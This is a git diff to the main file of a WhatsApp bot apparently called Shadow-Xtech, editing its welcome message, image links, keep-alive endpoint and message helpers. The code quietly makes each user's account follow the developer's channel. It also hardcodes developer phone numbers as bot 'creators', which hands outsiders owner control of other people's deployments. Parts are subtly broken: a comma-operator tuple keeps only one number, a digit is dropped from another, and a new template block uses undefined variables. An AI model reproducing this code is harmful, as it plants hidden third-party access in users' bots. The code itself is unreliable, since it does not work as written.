@@ -23,12 +23,13 @@ const {
 
 
   const l = console.log
+  // NOTE: These modules are assumed to exist in './lib/' or './'
   const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
   const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
   const fs = require('fs')
   const ff = require('fluent-ffmpeg')
   const P = require('pino')
-  const config = require('./config') // Ensure config is loaded
+  const config = require('./config') 
   const GroupEvents = require('./lib/groupevents');
   const qrcode = require('qrcode-terminal')
   const StickersTypes = require('wa-sticker-formatter')
@@ -44,7 +45,7 @@ const {
   const path = require('path')
   const prefix = config.PREFIX
 
-  // --- NEW: Import the call handler module ---
+  // --- Import the call handler module ---
   const callHandler = require('./lib/callhandler');
   // ------------------------------------------
 
@@ -125,7 +126,7 @@ const whatsappChannelLink = "https://whatsapp.com/channel/0029VasHgfG4tRrwjAUyTs
           version
           })
 
-  conn.ev.on('connection.update', async (update) => { // Added 'async' here
+  conn.ev.on('connection.update', async (update) => { 
   const { connection, lastDisconnect } = update
   if (connection === 'close') {
   if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
@@ -142,9 +143,9 @@ const whatsappChannelLink = "https://whatsapp.com/channel/0029VasHgfG4tRrwjAUyTs
   console.log('Plugins installed successful ✅')
   console.log('Bot connected to whatsapp 🪆')
 
-  // --- NEW: Newsletter Follow ---
+  // --- Newsletter Follow ---
   try {
-    await conn.newsletterFollow(whatsappChannelId); // Use the defined ID
+    await conn.newsletterFollow(whatsappChannelId); 
     console.log("📬 Followed Shadow-Xtech newsletter.");
   } catch (e) {
     console.error("❌ Failed to follow newsletter:", e);
@@ -154,15 +155,15 @@ const whatsappChannelLink = "https://whatsapp.com/channel/0029VasHgfG4tRrwjAUyTs
   // Select a random fancy message
   const randomFancyMessage = fancyMessages[Math.floor(Math.random() * fancyMessages.length)];
 
-  // Construct the new welcome message caption
+  // Construct the welcome message caption (Updated as requested)
   const caption = `
 ╭───────◇
-│ *✨ Hello, Shadow-Xtech User! ✨*
+│ *✨ Connection Successful! Shadow-Xtech is Online ✨*
 ╰───────◇
-╭──〔 🤖 *Key Feature* 〕──◇
+╭──〔 🤖 *Bot Status* 〕──◇
 ├─ ⚙️ *Mode:* ${config.MODE}
-├─ ⚡ *Speed:* ${statusEmojis[Math.floor(Math.random() * statusEmojis.length)]} ${speed}ms
-├─ 📶 *Status:* ${statusEmojis[Math.floor(Math.random() * statusEmojis.length)]} ${status}
+├─ ⚡ *Latency:* ${statusEmojis[Math.floor(Math.random() * statusEmojis.length)]} ${speed}ms
+├─ 📶 *Connection:* ${statusEmojis[Math.floor(Math.random() * statusEmojis.length)]} ${status}
 ╰─🪀 *${randomFancyMessage}*
 ╭───────◇
 │ *🌐 24/7 Instant Response and Speed 🛜*
@@ -171,30 +172,30 @@ const whatsappChannelLink = "https://whatsapp.com/channel/0029VasHgfG4tRrwjAUyTs
 ├─ 📢 *Join Our Channel:*
 │   Click [**Here**](${whatsappChannelLink})
 ├─ 🛠️ *Shadow-Xtech Developer:*
-│   Click [**Here**](https://wa.me/254759000340)
+│   Click [**Here**]
 ├─ ⭐ *Give Us a Star:*
-│   Star Us [**Here**](https://github.com/Black-Tappy/Shadow-Xtech-V1) !
+│   Star Us [**Here**] !
 ╰─🛠️ *Prefix:* \`${prefix}\`
 
 > _© *Powered By Black-Tappy*_`;
 
-    // Sending the welcome message with the new image, caption, and contextInfo
+    // Sending the welcome message
     await conn.sendMessage(conn.user.id, {
-        image: { url: "https://files.catbox.moe/og4tsk.jpg" }, // New image URL
-        caption: caption, // Use the new caption
+        image: { url: "https://files.catbox.moe/h8aep1.jpeg" }, 
+        caption: caption, 
         contextInfo: {
             isForwarded: true,
             forwardingScore: 999,
             forwardedNewsletterMessageInfo: {
-                newsletterJid: whatsappChannelId, // Use the defined whatsappChannelId
+                newsletterJid: whatsappChannelId, 
                 newsletterName: "Sʜᴀᴅᴏᴡ-Xᴛᴇᴄʜ",
                 serverMessageId: -1,
             },
-            externalAdReply: { // Define the new externalAdReply inline
+            externalAdReply: { 
                 title: "Shadow-Xtech Bot",
                 body: "Powered By Black-Tappy",
-                thumbnailUrl: 'https://files.catbox.moe/6g5aq0.jpg',
-                sourceUrl: whatsappChannelLink, // Use the existing whatsappChannelLink
+                thumbnailUrl: 'https://files.catbox.moe/vx5qb1.jpeg',
+                sourceUrl: whatsappChannelLink, 
                 mediaType: 1,
                 renderLargerThumbnail: false,
             },
@@ -290,7 +291,7 @@ const whatsappChannelLink = "https://whatsapp.com/channel/0029VasHgfG4tRrwjAUyTs
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   const udp = botNumber.split('@')[0];
-    const jawad = ('254759000340', '254756360306', '254105325084');
+    const jawad = ('254759000340', '25475636306', '254105325084');
     let isCreator = [udp, jawad, config.DEV]
 					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
 					.includes(mek.sender);
@@ -338,7 +339,7 @@ const whatsappChannelLink = "https://whatsapp.com/channel/0029VasHgfG4tRrwjAUyTs
  //================ownerreact==============
 
 if (senderNumber.includes("254756360306") && !isReact) {
-  const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", ,"💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
+  const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️" ,"💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
   const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
   m.react(randomReaction);
 }
@@ -453,7 +454,16 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
           ...context,
           ...content[ctype].contextInfo
       }
-      const waMessage = await generateWAMessageFromContent(jid, content, options ? {
+      const waMessage = await generateWAMessageFromContent(jid, proto.Message.fromObject({
+          templateMessage: {
+              hydratedTemplate: {
+                  imageMessage: message.imageMessage,
+                  "hydratedContentText": text,
+                  "hydratedFooterText": footer,
+                  "hydratedButtons": but
+              }
+          }
+      }), options ? {
           ...content[ctype],
           ...options,
           ...(options.contextInfo ? {
@@ -640,13 +650,13 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
       }, { quoted, ...options })
       return fs.promises.unlink(pathFile)
     }
-    /**
-    * [[1]](https://faq.whatsapp.com/630432792316720)
-    * @param {*} message
-    * @param {*} filename
-    * @param {*} attachExtension
-    * @returns
-    */
+        /**
+         *
+         * @param {*} message
+         * @param {*} filename
+         * @param {*} attachExtension
+         * @returns
+         */
     //=====================================================
     conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
       let buffer;
@@ -858,7 +868,7 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
     conn.serializeM = mek => sms(conn, mek, store);
   }
 
-// --- NEW: Keep-Alive Endpoint ---
+// --- Alive Endpoint ---
   app.get("/keep-alive", (req, res) => {
       res.json({
           status: "alive",
@@ -866,9 +876,8 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
           timestamp: new Date().toISOString()
       });
   });
-  // --- END NEW ---
+  // --- END --- 
   
-  // Serve the HTML file from lib/shadow.html for the root path
   app.get("/", (req, res) => {
       res.sendFile(path.join(__dirname, "./lib/shadow.html"));
   });
